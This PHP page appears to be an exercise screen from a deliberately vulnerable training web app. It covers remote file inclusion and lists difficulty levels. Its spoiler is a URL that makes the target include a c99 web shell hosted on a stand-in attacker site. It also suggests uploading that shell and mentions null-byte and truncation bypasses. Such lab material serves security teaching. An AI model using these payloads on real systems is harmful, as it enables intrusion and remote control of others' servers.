<?php include 'includes.php'; ?>

<body>	
	<div class="col-sm-9 col-sm-offset-3 col-lg-10 col-lg-offset-2 main">
		<div class="row">
			<ol class="breadcrumb">
				<li><a href="index.php">
					<em class="fa fa-home"></em>
				</a></li>
				<li>
					<a href="file_inc_home.php">
						File Inclusion
					</a>
				</li>
				<li >
					<a href="file_inclusion.php">
						 List of exercises
					</a>
					</li>
				<li class="active">Exercise 2</li>

			</ol>
		</div>
		
		<div class="row">
			<div class="col-lg-12">
				
			</div>
		</div>
		
		<div class="row">
			<div class="col-md-12">
				<div class="divider"></div>
				<div class="panel panel-primary">
					<div class="panel-heading">Take a small bite!
						
					</div>
					<div class="panel-body">
						<p><span class="glyphicon glyphicon-hand-right"></span> <b>Task:</b> List all the files in the system using the command.</p>
						<p><span class="glyphicon glyphicon-hand-right"> </span><b> Spoiler:</b> <em>http:///www.target.com/rfi.php?file = http://www.evilsite.com/c99.php</em></p>
						<p><span class="glyphicon glyphicon-hand-right"></span> <b>Elaboration: </b> You can try uploading a c99 shell for easy access to the target.</p>
						<hr>
						<p>
							<b>Low:</b> This is a file included with no security filtering.  <br>	
						</p><hr>
						<p>
							<b>Medium:</b> use null byte character or truncation methods to include the extension <em>.txt</em>
						</p><hr>
						<p>
							<b>High:</b> 
						</p><hr>
						<p><span class="glyphicon glyphicon-hand-right"></span>
							<b> Links: </b> <a href="https://www.google.com">Google Search</a>
						</p>
					</div>
				</div>
			</div>
		</div>		
	</div>
	<div class="col-sm-12">
		<p class="back-link">Sandwich Vulnerable Web app (SVWA) by <a href="#">SecurityGeeks</a></p>
	</div>